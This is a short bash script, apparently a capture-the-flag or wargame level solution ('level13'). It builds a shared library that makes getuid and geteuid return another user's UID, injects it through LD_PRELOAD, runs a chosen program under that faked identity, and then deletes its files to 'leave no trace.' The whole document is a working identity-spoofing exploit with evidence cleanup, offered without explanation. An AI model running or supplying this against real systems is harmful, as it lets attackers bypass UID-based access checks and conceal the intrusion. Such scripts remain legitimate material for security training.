#!/bin/bash

#usage: ./level13_exploit.sh <USER> <TARGET_APP>

FAKE_AS=$1
THE_UID=`/usr/bin/id -u $1`

echo "Faking user $FAKE_AS with UID $THE_UID"

cat << 'EOF' > /tmp/libFakeAs${FAKE_AS}.c
int getuid() {
    return FAKE_UID;
}

int geteuid() {
    return FAKE_UID;
    }
EOF

#Create the library to inject
/usr/bin/gcc -fPIC -shared -DFAKE_UID=`/usr/bin/id -u $FAKE_AS` -o /tmp/libFakeAs${FAKE_AS}.so /tmp/libFakeAs${FAKE_AS}.c

#Poison LD_PRELOAD

export LD_PRELOAD="/tmp/libFakeAs${FAKE_AS}.so"

echo "LD_PRELOAD poisoned with ${LD_PRELOAD}"

#Carry on

shift 1
$*

#Leave no trace
/bin/rm /tmp/libFakeAs${FAKE_AS}.c
/bin/rm /tmp/libFakeAs${FAKE_AS}.so